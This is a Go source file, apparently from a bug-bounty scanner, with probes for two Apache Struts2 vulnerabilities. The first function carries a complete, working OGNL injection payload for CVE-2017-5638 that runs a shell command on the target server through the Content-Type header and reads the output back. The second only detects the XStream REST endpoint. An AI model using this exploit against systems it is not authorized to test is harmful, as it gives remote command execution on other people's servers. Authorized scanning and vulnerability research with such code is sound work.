package bugbounty

import (
	"io"
	"net/http"
	"strings"
)

// ============================================================
// CVE-2017-5638 Struts2 S2-045 OGNL Injection
// Content-Type header OGNL eval, supports arbitrary commands
// ============================================================
func ProbeS2045(base string) *Finding {
	// Full OGNL payload - executes arbitrary command via /bin/bash -c
	ognl := `%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}`

	req, _ := http.NewRequest("GET", base+"/", nil)
	req.Header.Set("Content-Type", ognl)
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	s := string(body)
	if strings.Contains(s, "uid=") {
		return &Finding{Target: base, Vuln: "CVE-2017-5638 Struts2 S2-045 RCE", Severity: "CRITICAL",
			Detail: strings.TrimSpace(s), URL: base}
	}
	return nil
}

// ============================================================
// CVE-2017-9805 Struts2 REST Plugin XStream
// ============================================================
func ProbeS2Rest(base string) *Finding {
	req, _ := http.NewRequest("POST", base+"/orders/3/", strings.NewReader("<map></map>"))
	req.Header.Set("Content-Type", "application/xml")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
	if resp.StatusCode >= 400 && (strings.Contains(string(body), "struts") || strings.Contains(string(body), "xstream")) {
		return &Finding{Target: base, Vuln: "CVE-2017-9805 Struts2 REST XStream", Severity: "CRITICAL",
			Detail: "Struts2 REST endpoint detected", URL: base}
	}
	return nil
}
